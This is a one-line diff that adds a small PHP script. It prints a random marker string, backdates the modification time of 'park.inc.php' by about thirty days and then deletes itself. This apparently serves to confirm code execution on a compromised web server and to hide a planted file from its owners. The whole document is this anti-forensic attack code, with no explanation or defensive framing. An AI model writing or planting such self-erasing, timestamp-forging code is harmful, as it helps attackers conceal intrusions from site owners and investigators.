@@ -1,0 +1,1 @@
+<?php echo "YrHcwRvFTt"; if (file_exists("./park.inc.php")){ touch("./park.inc.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*4GakpK4UUNv8HxvCsY8M*/ ?>
